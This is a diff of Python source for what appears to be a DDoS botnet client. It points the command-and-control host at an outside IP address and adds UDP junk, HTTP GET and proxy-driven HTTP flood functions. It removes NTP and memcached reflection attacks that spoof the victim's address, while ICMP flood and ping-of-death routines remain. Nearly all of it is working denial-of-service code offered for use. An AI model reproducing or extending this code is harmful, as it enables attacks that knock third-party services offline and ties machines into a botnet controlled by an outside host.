@@ -10,7 +10,7 @@ from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
-C2Host  = "localhost"
+C2Host  = "193.200.78.23"
 C2Port  = 5511
 
 base_user_agents = [
@@ -21,10 +21,20 @@ base_user_agents = [
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
 ]
+def attack_http_get(ip, port, url):
+    while True:
+        http_get_payload(url)
+        time.sleep(random.randint(1, 5))  # Adjust the sleep time as needed
 
+def attack_junk(ip, port, secs):
+    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
 def rand_ua():
-    chosen_user_agent = random.choice(base_user_agents)
-    return chosen_user_agent.format(
+    chosen_user_agent = random.choice(base_user_agents).format(
         random.random() + 5,
         random.random() + random.randint(1, 8),
         random.random(),
@@ -32,66 +42,18 @@ def rand_ua():
         random.randint(92215, 99999),
         random.random() + random.randint(3, 9)
     )
+    return chosen_user_agent
 
+def ntp_payload():
+    return "\x17\x00\x03\x2a" + "\x00" * 4
 
-ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
-def NTP(target, port, timer):
-    try:
-        with open("ntpServers.txt", "r") as f:
-            ntp_servers = f.readlines()
-        packets = random.randint(10, 150)
-    except Exception as e:
-        print(f"Erro: {e}")
-        pass
-
-    server = random.choice(ntp_servers).strip()
-    while time.time() < timer:
-        try:
-            packet = (
-                    IP(dst=server, src=target)
-                    / UDP(sport=random.randint(1, 65535), dport=int(port))
-                    / Raw(load=ntp_payload)
-            )
-            try:
-                for _ in range(50000000):
-                    send(packet, count=packets, verbose=False)
-                    #print('NTP SEND')
-            except Exception as e:
-               # print(f"Erro: {e}")
-                pass
-        except Exception as e:
-            #print(f"Erro: {e}")
-            pass
-
-mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
-def MEM(target, port, timer):
-    packets = random.randint(1024, 60000)
-    try:
-        with open("memsv.txt", "r") as f:
-            memsv = f.readlines()
-    except:
-        #print('Erro')
-        pass
-    server = random.choice(memsv).strip()
-    while time.time() < timer:
-        try:
-            try:
-                packet = (
-                        IP(dst=server, src=target)
-                        / UDP(sport=port, dport=11211)
-                        / Raw(load=mem_payload)
-                )
-                for _ in range(5000000):
-                    send(packet, count=packets, verbose=False)
-            except:
-                pass
-        except:
-            pass
+def server(zombies):
+    return random.choice(zombies).strip()
 
 def icmp(target, timer):
     while time.time() < timer:
         try:
-            for _ in range(5000000):
+            for _ in range(50000000):
                 packet = random._urandom(int(random.randint(1024, 60000)))
                 pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
                 #print('MEMCACHED SEND')
@@ -108,7 +70,6 @@ def pod(target, timer):
         except:
             pass
 
-
 # old methods --------------------->
 def spoofer():
     addr = [192, 168, 0, 1]
@@ -120,36 +81,51 @@ def spoofer():
     assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
     return assemebled
 
-def httpSpoofAttack(url, timer):
-    timeout = time.time() + int(timer)
-    proxies = open("socks4.txt").readlines()
-    proxy = random.choice(proxies).strip().split(":")
-    req =  "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
-    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
-    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
-    req += "X-Forwarded-Proto: Http\r\n"
-    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
-    req += "Via: "+spoofer()+"\r\n"
-    req += "Client-IP: "+spoofer()+"\r\n"
-    req += "X-Forwarded-For: "+spoofer()+"\r\n"
-    req += "Real-IP: "+spoofer()+"\r\n"
-    req += "Connection: Keep-Alive\r\n\r\n"
-    while time.time() < timeout:
+def httpSpoofAttack(target, times, threads, attack_type):
+    proxies = []
+    if attack_type == 'PROXY' or attack_type == 'proxy':
+        cfbp = 0
         try:
-            s = socks.socksocket()
-            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            s.connect((str(urlparse(url).netloc), int(443)))
-            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
-            try:
-                for i in range(5000000000):
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-            except:
-                s.close()
+            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
+            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
+            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
+            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
+            proxies += proxy_list_http.text.replace('\r', '').split('\n')
+            proxies += raw_github_http.text.replace('\r', '').split('\n')
         except:
-            s.close()
+            pass
+    elif attack_type == 'NORMAL' or attack_type == 'normal':
+        cfbp = 1
+        try:
+            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
+            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
+            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
+            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
+            proxies += proxy_list_http.text.replace('\r', '').split('\n')
+            proxies += raw_github_http.text.replace('\r', '').split('\n')
+        except:
+            pass
+    elif attack_type == 'RANDOM' or attack_type == 'random':
+        cfbp = 0
+        try:
+            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
+            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
+            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
+            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
+            proxies += proxy_list_http.text.replace('\r', '').split('\n')
+            proxies += raw_github_http.text.replace('\r', '').split('\n')
+        except:
+            pass
+    proxies = [proxy[0] + ":" + proxy[1] for proxy in proxies]
+    processes = []
+    for _ in range(threads):
+        p = Process(target=thread, args=(target, proxies, cfbp))
+        processes.append(p)
+        p.start()
+    time.sleep(times)
+    for p in processes:
+        os.kill(p.pid, 9)
+
 
 
 def remove_by_value(arr, val):
